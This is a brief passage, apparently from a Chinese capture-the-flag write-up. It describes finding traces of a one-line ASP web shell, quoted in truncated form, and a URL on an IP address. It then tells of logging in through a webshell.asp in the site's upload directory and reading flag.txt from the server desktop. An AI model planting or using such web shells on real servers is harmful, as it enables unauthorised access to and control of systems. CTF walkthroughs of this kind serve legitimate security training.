...
`%><%Y=request(“hacker”)%><%...`,有一句话木马痕迹,发现*http://106.75.20.68/1.asp*,可以登陆服务器,在网站上传目录下有发现一个webshell.asp,登陆webshell,在服务器桌面上得到flag.txt文件,得到flag.
